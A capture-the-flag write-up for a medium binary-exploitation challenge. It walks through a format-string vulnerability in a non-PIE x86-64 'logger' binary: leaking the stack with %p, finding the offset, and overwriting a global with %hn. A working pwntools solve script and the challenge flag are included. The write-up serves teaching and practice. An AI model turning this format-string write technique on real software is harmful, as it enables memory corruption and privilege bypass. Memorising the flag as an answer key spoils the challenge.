# printf Is Not Your Friend

## Author

1-4m-5p33d

## Domain

Binary Exploitation

## Difficulty

Medium

### Question Description

We are given a Linux x86-64 logging utility named `logger`. The application prompts users to input an audit log entry, prints the processed event, and verifies whether the user is in "Maintenance Mode". Our objective is to achieve administrative privileges and retrieve the flag stored in `flag.txt`.

#### Provided Files / Connection:
- `logger` — Linux x86-64 ELF executable (dynamically linked, not stripped, PIE disabled).
- Remote connection (if deployed): `nc <host> <port>`

### Intended Solution

The challenge tests understanding of x86-64 format string vulnerabilities, calling conventions, and arbitrary memory writes via `%n` / `%hn` in non-PIE binaries.

Run `file` and `checksec` on `logger`:

```bash
file logger
# logger: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
python3 -c "import pwn; pwn.ELF('./logger').checksec()"
```

Security properties:
- **Arch:** x86-64 (amd64)
- **PIE:** Disabled (`No PIE` at base `0x400000`). All `.bss` and `.text` symbol addresses are fixed.
- **NX:** Enabled (Stack is non-executable).
- **Canary:** No stack canary.
- **RELRO:** Partial RELRO (Global variables in `.bss` are writable).

Running the program:
```bash
./logger
# Enter audit log message:
# > %p.%p.%p.%p.%p.%p.%p.%p
# [*] Processing audit log:
# 0x7f716701a603.0x7f716701b750.0x7f716701b750.(nil).(nil).0x70252e70252e7025...
```
Passing format specifiers like `%p` leaks stack and register values, proving that user input is passed directly to `printf(buf)` without a format string template.

When the program terminates normally, it outputs:
```text
[-] Access Denied. Maintenance mode remains LOCKED (authorized = 0x0000).
```

Because the binary is unstripped and lacks PIE, we can look up the symbol `authorized` directly:
```bash
readelf -s logger | grep authorized
# 34: 000000000040408c     4 OBJECT  GLOBAL DEFAULT   26 authorized
```
The variable `authorized` is a 4-byte integer in `.bss` at static address `0x40408c`.

Disassembling `main`:
```asm
mov    eax, DWORD PTR [rip+0x2fd2]   # 0x40408c <authorized>
cmp    eax, 0x1337
jne    0x40134a
call   0x4011bd <print_flag>
```
To trigger `print_flag()`, we must overwrite `authorized` with `0x1337` ($4919_{10}$).

Under the x86-64 System V Calling Convention, the first 6 arguments reside in registers (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`), and subsequent arguments reside on the stack.

To find where our input buffer starts on the stack, send an identifiable marker:
```bash
./logger
# Enter audit log message:
# > AAAAAAAA_%6$p
# [*] Processing audit log:
# AAAAAAAA_0x4141414141414141
```
`%6$p` returns `0x4141414141414141`, confirming our input buffer begins at argument offset **6**.

We want to write `4919` (`0x1337`) to `0x40408c`.
Because 64-bit addresses like `0x000000000040408c` contain null bytes (`\x00`), placing the address at the beginning of the buffer would terminate `printf` early.

Instead, we place the format specifier first, pad to an 8-byte boundary, and append the target address at the end:
```text
[ Offset 6: 8 bytes ] -> "%4919c%8"
[ Offset 7: 8 bytes ] -> "$hnAAAAA"  (5 bytes padding)
[ Offset 8: 8 bytes ] -> \x8c\x40\x40\x00\x00\x00\x00\x00 (&authorized)
```

1. `%4919c` prints 4919 characters, setting `printf`'s internal character count to `4919` (`0x1337`).
2. `%8$hn` writes a 2-byte short (`0x1337`) to the pointer located at stack argument offset 8.
3. Offset 8 holds the address `0x40408c`.

#### Exploitation Script (`solve.py`)

Using pwntools:

```python
#!/usr/bin/env python3
from pwn import *

context.clear(arch="amd64")
bin_path = "./logger"
elf = ELF(bin_path)

target_addr = elf.symbols["authorized"]  # 0x40408c
target_value = 0x1337                   # 4919

# Offset 6 is our input buffer
payload = fmtstr_payload(6, {target_addr: target_value}, write_size="short")

io = process(bin_path)
io.sendlineafter(b"> ", payload)
output = io.recvall().decode(errors="ignore")

for line in output.splitlines():
    if "FLAG:" in line or "kernel{" in line:
        print(line)
```

Output:
```text
[+] Authorization check passed (authorized == 0x1337)!
[+] FLAG: kernel{format_strings_are_powerful}
```

### Flag

> `kernel{format_strings_are_powerful}`
